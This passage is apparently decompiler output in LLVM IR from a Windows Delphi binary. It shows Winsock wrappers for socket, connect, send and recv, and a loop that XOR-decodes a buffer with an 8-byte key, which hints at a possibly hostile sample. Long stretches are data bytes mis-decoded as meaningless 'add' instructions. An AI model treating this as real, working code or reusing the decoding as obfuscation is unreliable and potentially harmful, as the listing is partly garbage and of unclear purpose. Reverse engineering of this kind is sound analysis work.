  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810(i32 %arg1) local_unnamed_addr {
dec_label_pc_404810:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i1 @__decompiler_undefined_function_1()
  %5 = add i32 %1, 117, !insn.addr !322
  %6 = inttoptr i32 %5 to i32*, !insn.addr !322
  %7 = load i32, i32* %6, align 4, !insn.addr !322
  br i1 %4, label %dec_label_pc_404891, label %dec_label_pc_40481b, !insn.addr !323

dec_label_pc_40481b:                              ; preds = %dec_label_pc_404810
  %8 = load i32, i32* inttoptr (i32 812544100 to i32*), align 4, !insn.addr !324
  %9 = sub i32 %0, %8, !insn.addr !324
  %10 = mul i32 %7, 1616934626, !insn.addr !325
  %11 = add i32 %10, %3, !insn.addr !325
  %12 = inttoptr i32 %11 to i64*, !insn.addr !325
  %13 = load i64, i64* %12, align 4, !insn.addr !325
  %14 = call i32 @__asm_bound(i64 %13), !insn.addr !325
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !326
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !326
  %19 = add i8 %16, %18, !insn.addr !326
  %20 = inttoptr i32 %17 to i8*, !insn.addr !326
  store i8 %19, i8* %20, align 1, !insn.addr !326
  %21 = load i8, i8* %15, align 4, !insn.addr !327
  %22 = load i32, i32* %eax, align 4
  %23 = trunc i32 %22 to i8, !insn.addr !327
  %24 = add i8 %21, %23, !insn.addr !327
  %25 = inttoptr i32 %22 to i8*, !insn.addr !327
  store i8 %24, i8* %25, align 1, !insn.addr !327
  %26 = load i8, i8* %15, align 4, !insn.addr !328
  %27 = load i32, i32* %eax, align 4
  %28 = trunc i32 %27 to i8, !insn.addr !328
  %29 = add i8 %26, %28, !insn.addr !328
  %30 = inttoptr i32 %27 to i8*, !insn.addr !328
  store i8 %29, i8* %30, align 1, !insn.addr !328
  %31 = load i8, i8* %15, align 4, !insn.addr !329
  %32 = load i32, i32* %eax, align 4
  %33 = trunc i32 %32 to i8, !insn.addr !329
  %34 = add i8 %31, %33, !insn.addr !329
  %35 = inttoptr i32 %32 to i8*, !insn.addr !329
  store i8 %34, i8* %35, align 1, !insn.addr !329
  %36 = load i8, i8* %15, align 4, !insn.addr !330
  %37 = load i32, i32* %eax, align 4
  %38 = trunc i32 %37 to i8, !insn.addr !330
  %39 = add i8 %36, %38, !insn.addr !330
  %40 = inttoptr i32 %37 to i8*, !insn.addr !330
  store i8 %39, i8* %40, align 1, !insn.addr !330
  %41 = load i8, i8* %15, align 4, !insn.addr !331
  %42 = load i32, i32* %eax, align 4
  %43 = trunc i32 %42 to i8, !insn.addr !331
  %44 = add i8 %41, %43, !insn.addr !331
  %45 = inttoptr i32 %42 to i8*, !insn.addr !331
  store i8 %44, i8* %45, align 1, !insn.addr !331
  %46 = load i8, i8* %15, align 4, !insn.addr !332
  %47 = load i32, i32* %eax, align 4
  %48 = trunc i32 %47 to i8, !insn.addr !332
  %49 = add i8 %46, %48, !insn.addr !332
  %50 = inttoptr i32 %47 to i8*, !insn.addr !332
  store i8 %49, i8* %50, align 1, !insn.addr !332
  %51 = load i8, i8* %15, align 4, !insn.addr !333
  %52 = load i32, i32* %eax, align 4
  %53 = trunc i32 %52 to i8, !insn.addr !333
  %54 = add i8 %51, %53, !insn.addr !333
  %55 = inttoptr i32 %52 to i8*, !insn.addr !333
  store i8 %54, i8* %55, align 1, !insn.addr !333
  %56 = load i8, i8* %15, align 4, !insn.addr !334
  %57 = load i32, i32* %eax, align 4
  %58 = trunc i32 %57 to i8, !insn.addr !334
  %59 = add i8 %56, %58, !insn.addr !334
  %60 = inttoptr i32 %57 to i8*, !insn.addr !334
  store i8 %59, i8* %60, align 1, !insn.addr !334
  %61 = load i8, i8* %15, align 4, !insn.addr !335
  %62 = load i32, i32* %eax, align 4
  %63 = trunc i32 %62 to i8, !insn.addr !335
  %64 = add i8 %61, %63, !insn.addr !335
  %65 = inttoptr i32 %62 to i8*, !insn.addr !335
  store i8 %64, i8* %65, align 1, !insn.addr !335
  %66 = load i8, i8* %15, align 4, !insn.addr !336
  %67 = load i32, i32* %eax, align 4
  %68 = trunc i32 %67 to i8, !insn.addr !336
  %69 = add i8 %66, %68, !insn.addr !336
  %70 = inttoptr i32 %67 to i8*, !insn.addr !336
  store i8 %69, i8* %70, align 1, !insn.addr !336
  %71 = load i8, i8* %15, align 4, !insn.addr !337
  %72 = load i32, i32* %eax, align 4
  %73 = trunc i32 %72 to i8, !insn.addr !337
  %74 = add i8 %71, %73, !insn.addr !337
  %75 = inttoptr i32 %72 to i8*, !insn.addr !337
  store i8 %74, i8* %75, align 1, !insn.addr !337
  %76 = load i8, i8* %15, align 4, !insn.addr !338
  %77 = load i32, i32* %eax, align 4
  %78 = trunc i32 %77 to i8, !insn.addr !338
  %79 = add i8 %76, %78, !insn.addr !338
  %80 = inttoptr i32 %77 to i8*, !insn.addr !338
  store i8 %79, i8* %80, align 1, !insn.addr !338
  %81 = load i8, i8* %15, align 4, !insn.addr !339
  %82 = load i32, i32* %eax, align 4
  %83 = trunc i32 %82 to i8, !insn.addr !339
  %84 = add i8 %81, %83, !insn.addr !339
  %85 = inttoptr i32 %82 to i8*, !insn.addr !339
  store i8 %84, i8* %85, align 1, !insn.addr !339
  %86 = load i8, i8* %15, align 4, !insn.addr !340
  %87 = load i32, i32* %eax, align 4
  %88 = trunc i32 %87 to i8, !insn.addr !340
  %89 = add i8 %86, %88, !insn.addr !340
  %90 = inttoptr i32 %87 to i8*, !insn.addr !340
  store i8 %89, i8* %90, align 1, !insn.addr !340
  %91 = load i8, i8* %15, align 4, !insn.addr !341
  %92 = load i32, i32* %eax, align 4
  %93 = trunc i32 %92 to i8, !insn.addr !341
  %94 = add i8 %91, %93, !insn.addr !341
  %95 = inttoptr i32 %92 to i8*, !insn.addr !341
  store i8 %94, i8* %95, align 1, !insn.addr !341
  %96 = load i8, i8* %15, align 4, !insn.addr !342
  %97 = load i32, i32* %eax, align 4
  %98 = trunc i32 %97 to i8, !insn.addr !342
  %99 = add i8 %96, %98, !insn.addr !342
  %100 = inttoptr i32 %97 to i8*, !insn.addr !342
  store i8 %99, i8* %100, align 1, !insn.addr !342
  %101 = load i8, i8* %15, align 4, !insn.addr !343
  %102 = load i32, i32* %eax, align 4
  %103 = trunc i32 %102 to i8, !insn.addr !343
  %104 = add i8 %101, %103, !insn.addr !343
  %105 = inttoptr i32 %102 to i8*, !insn.addr !343
  store i8 %104, i8* %105, align 1, !insn.addr !343
  %106 = load i8, i8* %15, align 4, !insn.addr !344
  %107 = load i32, i32* %eax, align 4
  %108 = trunc i32 %107 to i8, !insn.addr !344
  %109 = add i8 %106, %108, !insn.addr !344
  %110 = inttoptr i32 %107 to i8*, !insn.addr !344
  store i8 %109, i8* %110, align 1, !insn.addr !344
  %111 = load i8, i8* %15, align 4, !insn.addr !345
  %112 = load i32, i32* %eax, align 4
  %113 = trunc i32 %112 to i8, !insn.addr !345
  %114 = add i8 %111, %113, !insn.addr !345
  %115 = inttoptr i32 %112 to i8*, !insn.addr !345
  store i8 %114, i8* %115, align 1, !insn.addr !345
  %116 = trunc i32 %2 to i16, !insn.addr !346
  %117 = call i32 @__asm_insd(i16 %116), !insn.addr !346
  %118 = inttoptr i32 %9 to i32*, !insn.addr !346
  store i32 %117, i32* %118, align 4, !insn.addr !346
  %119 = load i32, i32* %eax, align 4, !insn.addr !346
  ret i32 %119, !insn.addr !346

dec_label_pc_404891:                              ; preds = %dec_label_pc_404810
  %120 = load i32, i32* %eax, align 4
  %121 = inttoptr i32 %120 to i8*, !insn.addr !347
  %122 = load i8, i8* %121, align 1, !insn.addr !347
  %123 = trunc i32 %120 to i8, !insn.addr !347
  %124 = add i8 %122, %123, !insn.addr !347
  store i8 %124, i8* %121, align 1, !insn.addr !347
  %125 = load i32, i32* %eax, align 4
  %126 = inttoptr i32 %125 to i8*, !insn.addr !348
  %127 = load i8, i8* %126, align 1, !insn.addr !348
  %128 = trunc i32 %125 to i8, !insn.addr !348
  %129 = add i8 %127, %128, !insn.addr !348
  store i8 %129, i8* %126, align 1, !insn.addr !348
  %130 = load i32, i32* %eax, align 4
  %131 = inttoptr i32 %130 to i8*, !insn.addr !349
  %132 = load i8, i8* %131, align 1, !insn.addr !349
  %133 = trunc i32 %130 to i8, !insn.addr !349
  %134 = add i8 %132, %133, !insn.addr !349
  store i8 %134, i8* %131, align 1, !insn.addr !349
  %135 = add i32 %1, 102, !insn.addr !350
  %136 = inttoptr i32 %135 to i8*, !insn.addr !350
  %137 = load i8, i8* %136, align 1, !insn.addr !350
  %138 = udiv i32 %3, 256, !insn.addr !350
  %139 = trunc i32 %138 to i8, !insn.addr !350
  %140 = add i8 %137, %139, !insn.addr !350
  store i8 %140, i8* %136, align 1, !insn.addr !350
  %141 = icmp eq i32 %3, -1, !insn.addr !351
  br i1 %141, label %dec_label_pc_404916, label %dec_label_pc_4048a6, !insn.addr !352

dec_label_pc_4048a6:                              ; preds = %dec_label_pc_404891
  %142 = mul i32 %7, 808467313, !insn.addr !322
  %143 = add i32 %142, 61, !insn.addr !353
  %144 = inttoptr i32 %143 to i32*, !insn.addr !353
  %145 = load i32, i32* %144, align 4, !insn.addr !353
  %146 = mul i32 %145, 7237732, !insn.addr !353
  %147 = load i32, i32* %eax, align 4
  %148 = inttoptr i32 %147 to i8*, !insn.addr !354
  %149 = load i8, i8* %148, align 1, !insn.addr !354
  %150 = trunc i32 %147 to i8, !insn.addr !354
  %151 = add i8 %149, %150, !insn.addr !354
  store i8 %151, i8* %148, align 1, !insn.addr !354
  %152 = load i32, i32* %eax, align 4
  %153 = inttoptr i32 %152 to i8*, !insn.addr !355
  %154 = load i8, i8* %153, align 1, !insn.addr !355
  %155 = trunc i32 %152 to i8, !insn.addr !355
  %156 = add i8 %154, %155, !insn.addr !355
  store i8 %156, i8* %153, align 1, !insn.addr !355
  %157 = load i32, i32* %eax, align 4
  %158 = inttoptr i32 %157 to i8*, !insn.addr !356
  %159 = load i8, i8* %158, align 1, !insn.addr !356
  %160 = trunc i32 %157 to i8, !insn.addr !356
  %161 = add i8 %159, %160, !insn.addr !356
  store i8 %161, i8* %158, align 1, !insn.addr !356
  %162 = load i32, i32* %eax, align 4
  %163 = inttoptr i32 %162 to i8*, !insn.addr !357
  %164 = load i8, i8* %163, align 1, !insn.addr !357
  %165 = trunc i32 %162 to i8, !insn.addr !357
  %166 = add i8 %164, %165, !insn.addr !357
  store i8 %166, i8* %163, align 1, !insn.addr !357
  %167 = load i32, i32* %eax, align 4
  %168 = inttoptr i32 %167 to i8*, !insn.addr !358
  %169 = load i8, i8* %168, align 1, !insn.addr !358
  %170 = trunc i32 %167 to i8, !insn.addr !358
  %171 = add i8 %169, %170, !insn.addr !358
  store i8 %171, i8* %168, align 1, !insn.addr !358
  %172 = load i32, i32* %eax, align 4
  %173 = inttoptr i32 %172 to i8*, !insn.addr !359
  %174 = load i8, i8* %173, align 1, !insn.addr !359
  %175 = trunc i32 %172 to i8, !insn.addr !359
  %176 = add i8 %174, %175, !insn.addr !359
  store i8 %176, i8* %173, align 1, !insn.addr !359
  %177 = load i32, i32* %eax, align 4
  %178 = inttoptr i32 %177 to i8*, !insn.addr !360
  %179 = load i8, i8* %178, align 1, !insn.addr !360
  %180 = trunc i32 %177 to i8, !insn.addr !360
  %181 = add i8 %179, %180, !insn.addr !360
  store i8 %181, i8* %178, align 1, !insn.addr !360
  %182 = load i32, i32* %eax, align 4
  %183 = inttoptr i32 %182 to i8*, !insn.addr !361
  %184 = load i8, i8* %183, align 1, !insn.addr !361
  %185 = trunc i32 %182 to i8, !insn.addr !361
  %186 = add i8 %184, %185, !insn.addr !361
  store i8 %186, i8* %183, align 1, !insn.addr !361
  %187 = load i32, i32* %eax, align 4
  %188 = inttoptr i32 %187 to i8*, !insn.addr !362
  %189 = load i8, i8* %188, align 1, !insn.addr !362
  %190 = trunc i32 %187 to i8, !insn.addr !362
  %191 = add i8 %189, %190, !insn.addr !362
  store i8 %191, i8* %188, align 1, !insn.addr !362
  %192 = load i32, i32* %eax, align 4
  %193 = inttoptr i32 %192 to i8*, !insn.addr !363
  %194 = load i8, i8* %193, align 1, !insn.addr !363
  %195 = trunc i32 %192 to i8, !insn.addr !363
  %196 = add i8 %194, %195, !insn.addr !363
  store i8 %196, i8* %193, align 1, !insn.addr !363
  %197 = load i32, i32* %eax, align 4
  %198 = inttoptr i32 %197 to i8*, !insn.addr !364
  %199 = load i8, i8* %198, align 1, !insn.addr !364
  %200 = trunc i32 %197 to i8, !insn.addr !364
  %201 = add i8 %199, %200, !insn.addr !364
  store i8 %201, i8* %198, align 1, !insn.addr !364
  %202 = load i32, i32* %eax, align 4
  %203 = inttoptr i32 %202 to i8*, !insn.addr !365
  %204 = load i8, i8* %203, align 1, !insn.addr !365
  %205 = trunc i32 %202 to i8, !insn.addr !365
  %206 = add i8 %204, %205, !insn.addr !365
  store i8 %206, i8* %203, align 1, !insn.addr !365
  %207 = load i32, i32* %eax, align 4
  %208 = inttoptr i32 %207 to i8*, !insn.addr !366
